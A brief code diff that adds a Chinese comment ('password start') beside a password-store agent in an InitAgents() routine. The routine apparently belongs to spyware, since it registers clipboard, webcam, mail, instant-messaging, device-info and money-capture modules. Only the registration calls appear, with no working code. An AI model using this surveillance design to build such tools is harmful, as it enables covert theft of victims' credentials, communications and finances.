@@ -420,7 +420,7 @@ void InitAgents()
 	PM_ClipBoardRegister();
 	PM_WebCamRegister();
 	PM_MailCapRegister();
-	PM_PStoreAgentRegister();
+	PM_PStoreAgentRegister(); //密码开始
 	PM_IMRegister();
 	PM_DeviceInfoRegister();
 	PM_MoneyRegister();
